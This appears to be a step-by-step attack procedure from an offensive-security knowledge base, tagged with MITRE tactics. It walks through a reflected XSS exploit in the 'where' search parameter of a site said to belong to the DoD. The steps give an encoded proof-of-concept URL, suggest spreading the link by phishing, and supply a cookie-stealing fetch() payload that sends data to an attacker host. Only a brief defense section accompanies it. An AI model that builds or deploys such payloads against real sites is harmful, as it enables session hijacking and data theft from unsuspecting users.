---
id: proc-uuid-2
tags:
  - xss
  - reflected-xss
  - javascript
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.926Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Where-Parameter

## Summary

This procedure demonstrates injecting a malicious JavaScript payload into the 'where' search parameter of a DoD website to exploit a reflected XSS vulnerability, resulting in arbitrary code execution in the victim's browser and potential data exfiltration.

## Description

The attack targets insufficient input sanitization in the search functionality, where the 'where' parameter is reflected back into the HTML without escaping. By appending a payload like "><svg+onload=confirm(document.domain)>, the attacker closes the attribute and injects an SVG element with an onload event that executes JavaScript. In a real scenario, this could be adapted to steal cookies (e.g., via XMLHttpRequest to an attacker server). The target environment is a web browser accessing the public site, with outcomes including browser alerts or data theft.

## Requirements

1. Access to the vulnerable search endpoint from the previous procedure.
2. Knowledge of URL encoding for payloads (e.g., %22 for ").
3. A test victim or self-testing environment to observe execution.

## Defense

Defensive measures and detection strategies:

- Validate and sanitize search inputs to remove or escape HTML/JS characters.
- Use output encoding (e.g., htmlspecialchars in PHP) for reflected parameters.
- Deploy Web Application Firewall (WAF) rules to block common XSS payloads.

## Objectives

1. Trigger JavaScript execution via reflected injection.
2. Demonstrate potential for session theft by accessing document.cookie.
3. Validate exploit success through observable effects like alerts.

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Modify the search URL to include the XSS payload in the 'where' parameter.

Construct the URL by appending the payload to the base: https://████/7/0/33/1d/[www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E]. URL-encode special characters: %22 for ", %3E for >, etc.

> This creates a complete POC link that can be shared via email or phishing.

### Step 2: Execute and Verify

**Context**: Load the URL in a browser to trigger the payload.

Paste the crafted URL into a browser address bar and press Enter. Observe the page load and watch for the confirmation dialog displaying the domain.

> If successful, the onload event fires, executing confirm(document.domain). For real impact, replace with a payload like <script>fetch('http://attacker.com?cookie='+document.cookie)</script> to exfiltrate data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
- [[exploitation]]
